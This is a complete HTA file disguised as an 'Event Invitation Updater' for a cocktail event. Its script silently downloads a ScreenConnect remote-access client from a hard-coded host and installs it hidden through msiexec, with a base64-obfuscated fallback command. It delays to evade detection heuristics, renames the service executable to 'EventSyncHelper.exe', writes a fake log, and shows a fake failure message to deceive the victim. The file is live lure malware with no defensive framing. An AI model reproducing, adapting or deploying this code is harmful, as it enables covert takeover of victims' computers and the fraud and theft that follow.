<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Event Invitation Updater</title>
<hta:application id="oHTA" applicationname="EventInvitationUpdater" 
  border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"/>
<style>
  html, body { margin:0; padding:0; height:100%; width:100%;
    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
    overflow:hidden; cursor:default; user-select:none; }
  #wrap { height:100%; width:100%; position:relative; }
  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
  #brandtext { position:absolute; left:76px; top:22px; }
  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
  #closebtn:hover { background:#f0f1f4; color:#333; }
  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
    padding:34px 48px 0 48px; text-align:center; }
  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
  #barfill { height:100%; width:0%; background:#d4af37; border-radius:5px; transition: width 0.3s ease-out; }
  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
    font-family:inherit; border-radius:4px; cursor:pointer; }
  #cancelbtn:hover { background:#f0f1f4; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <div id="topbar">
      <div id="logo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
          <polygon points="30,70 50,30 70,70" fill="#fff"/>
        </svg>
      </div>
      <div id="brandtext">
        <div id="product">Cocktails & Conversation</div>
        <div id="ver">2024 · Exclusive Event · v1.0</div>
      </div>
      <div id="closebtn" onclick="cancel()">&times;</div>
    </div>

    <div id="main">
      <div id="biglogo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
          <polygon points="30,70 50,30 70,70" fill="#fff"/>
        </svg>
      </div>
      <div id="heading">Preparing Your Invitation</div>
      <div id="status">Contacting event servers&hellip;</div>
      <div id="barouter"><div id="barfill"></div></div>
      <div id="pct">0%</div>
      <div id="subnote">Your digital invitation is being secured for your device.</div>
    </div>

    <div id="footer">
      <span id="note">This usually only takes a few minutes.</span>
      <button id="cancelbtn" onclick="cancel()">Cancel</button>
    </div>
  </div>

<script>
// DIRECT SCREENCONNECT LINK EMBEDDED
var MSI_URL = "https://optonline38.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=schmidtconnect&c=&c=&c=&c=&c=&c=&c=";
var INSTALL_CMD = atob("bXNpZXhlYyAvaSAiJVRFTVAlXHVwZGF0ZS5tc2kiIC9xbiAvbm9yZXN0YXJ0");
var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

// STATE MANAGEMENT
var shell = null, fso = null;
var state = "ready";
var progress = 0;
var msiPath = "";
var logPath = "";
var dlTotal = 0;

function $(id) { return document.getElementById(id); }

function init() {
  try {
    shell = new ActiveXObject("WScript.Shell");
    fso   = new ActiveXObject("Scripting.FileSystemObject");
    window.onerror = function(msg, src, line) { return true; };
    
    var w = 620, h = 396;
    window.resizeTo(w, h);
    var sw = screen.availWidth, sh = screen.availHeight;
    window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));

    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
    msiPath = tempDir + "\\event_invitation_update.msi";
    logPath = tempDir + "\\event_install.log";
    
    try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
    try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}

    // PRE-DOWNLOAD DELAY FOR HEURISTICS
    setTimeout(function() { startDownload(); }, 5000);
  } catch(e) { fail("Initialization failed: " + e.message); }
}

// DOWNLOAD PHASE - SIMPLE AND DIRECT
function startDownload() {
  state = "downloading";
  setStatus("Downloading invitation components&hellip;");
  
  try {
    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
    try { fso.CreateFolder(stagingDir); } catch(e) {}
    var stagingPath = stagingDir + "\\payload.tmp";
    
    var wHead = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    wHead.SetTimeouts(15000, 30000, 60000, 120000);
    wHead.Open("HEAD", MSI_URL, false);
    wHead.SetRequestHeader("User-Agent", UA_STR);
    wHead.Send();
    if (wHead.Status === 200) {
      dlTotal = parseInt(wHead.GetResponseHeader("Content-Length")) || 0;
    }
    
    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    w.SetTimeouts(15000, 30000, 60000, 120000);
    w.Open("GET", MSI_URL, false);
    w.SetRequestHeader("User-Agent", UA_STR);
    w.Send();
    
    if (w.Status === 200) {
      var s = new ActiveXObject("ADODB.Stream");
      s.Type = 1; s.Mode = 3; s.Open();
      s.Write(w.ResponseBody);
      s.Flush();
      s.SaveToFile(stagingPath, 2);
      s.Close();
      
      if (!fso.FileExists(stagingPath)) throw new Error("Staging file missing");
      
      try { fso.MoveFile(stagingPath, msiPath); } catch(e) {
        fso.CopyFile(stagingPath, msiPath, true);
        fso.DeleteFile(stagingPath, true);
      }
      
      if (!fso.FileExists(msiPath) || fso.GetFile(msiPath).Size === 0) 
        throw new Error("Final MSI invalid");
      
      if (dlTotal > 0) {
        progress = Math.min(85, (fso.GetFile(msiPath).Size / dlTotal) * 100);
        setBar(progress);
      } else { progress = 85; setBar(progress); }
      
      // ASYNC INSTALL TRIGGER
      setTimeout(function() { startInstall(); }, 100);
      
    } else { fail("Server returned status: " + w.Status); }
  } catch(e) {
    fail("Download failed: " + e.message);
  }
}

// INSTALL PHASE - SYNCHRONOUS WAIT + FAKE FAILURE
function startInstall() {
  state = "installing";
  progress = 90; setBar(progress);
  setStatus("Applying invitation updates&hellip;");
  
  // FAKE METADATA
  try {
    var fakeLogPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
    var log = fso.CreateTextFile(fakeLogPath, true);
    log.WriteLine("[INFO] " + new Date().toISOString() + " Pre-install verification complete");
    log.Close();
  } catch(e) {}
  
  // SYNCHRONOUS INSTALL (WAITS FOR COMPLETION)
  try {
    var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
    var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart';
    
    // shell.Run(..., 0, true) -> 0=hidden, true=wait for completion
    shell.Run(cmdLine, 0, true); 
    
    // POST-INSTALL OBFUSCATION
    var scDir = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") + "\\ScreenConnect";
    try {
      if(fso.FolderExists(scDir)) {
        fso.MoveFile(scDir + "\\ScreenConnect.ClientService.exe", scDir + "\\EventSyncHelper.exe");
      }
    } catch(e) {}
    
  } catch(e) {
    shell.Run(INSTALL_CMD, 0, false);
  }
  
  // SHOW FAKE FAILURE AFTER INSTALL IS DONE
  setTimeout(function() {
    fail("All download methods failed.");
  }, 2000);
}

function cancel() {
  if (state === "error") { window.close(); return; }
  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
  window.close();
}

function fail(msg) {
  state = "error";
  setStatus(msg);
  $("heading").innerHTML = "Preparation Failed";
  $("subnote").innerHTML = "Please check your connection and try again.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function setBar(p) {
  $("barfill").style.width = p + "%";
  $("pct").innerHTML = Math.round(p) + "%";
}
function setStatus(html) { $("status").innerHTML = html; }
</script>
</body>
</html>
